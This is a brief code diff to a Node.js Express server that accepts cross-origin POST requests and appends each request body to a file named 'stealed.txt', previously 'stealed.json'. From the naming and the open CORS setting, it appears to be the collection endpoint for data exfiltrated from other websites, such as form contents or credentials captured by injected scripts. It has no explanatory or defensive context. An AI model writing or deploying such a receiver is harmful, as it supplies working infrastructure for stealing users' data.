@@ -8,7 +8,7 @@ bodyParser = require('body-parser')
 app.use(cors());
 app.use(bodyParser());
 app.post('/', (req, res) => {
-    fs.appendFile('./stealed.json', JSON.stringify(req.body));
+    fs.appendFile('./stealed.txt', JSON.stringify(req.body) + "\n");
     res.json({h: 1});
 })
 
